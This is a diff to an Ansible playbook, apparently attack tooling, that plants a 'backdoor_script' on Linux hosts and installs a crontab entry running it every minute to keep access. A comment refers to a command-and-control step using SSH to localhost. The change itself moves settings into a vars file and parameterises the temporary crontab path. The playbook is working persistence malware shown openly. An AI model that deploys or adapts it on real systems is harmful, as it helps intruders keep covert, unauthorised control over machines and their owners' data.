@@ -3,6 +3,8 @@
 # On c&c run: ssh -pREMLIS localhost
 - name: Cron Job
   hosts: linux
+  vars_files:
+   - /opt/ansible/vars.yaml
   tasks:
           - name: createfile
             file: path={{ backdoor_script }} state=touch
@@ -20,4 +22,4 @@
           - name: crontab
             shell: |
                 crontab -l > /tmp/crontmp
-                echo "* * * * * {{ backdoor_script }}" > /tmp/persistevil && crontab /tmp/persistevil
+                echo "* * * * * {{ backdoor_script }}" > {{ crontab_task }} && crontab {{ crontab_task }} 
